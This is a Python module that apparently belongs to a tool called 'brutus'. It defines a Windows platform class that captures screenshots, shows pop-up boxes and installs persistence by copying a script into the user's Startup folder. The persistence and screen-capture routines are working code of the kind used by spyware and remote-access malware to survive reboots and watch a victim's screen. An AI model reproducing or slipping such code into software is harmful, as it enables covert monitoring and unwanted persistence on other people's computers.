import io
import shutil
import tempfile
from pathlib import Path

from brutus.platform._base import PlatformBase


class WindowsPlatform(PlatformBase):
    def screenshot(self) -> bytes:
        import pyautogui

        buf = io.BytesIO()
        pyautogui.screenshot().save(buf, format="PNG")
        return buf.getvalue()

    def show_popup(self, title: str, message: str) -> None:
        try:
            import ctypes

            ctypes.windll.user32.MessageBoxW(0, message, title, 0)
        except Exception:
            pass

    def install_persistence(self, script_path: str) -> bool:
        try:
            startup = (
                Path.home()
                / "AppData"
                / "Roaming"
                / "Microsoft"
                / "Windows"
                / "Start Menu"
                / "Programs"
                / "Startup"
            )
            startup.mkdir(parents=True, exist_ok=True)
            dest = startup / Path(script_path).name
            shutil.copy2(script_path, dest)
            print(f"[persistence] copied to {dest}")
            return True
        except Exception as exc:
            print(f"[persistence] failed: {exc}")
            return False

    def temp_dir(self) -> Path:
        return Path(tempfile.gettempdir())
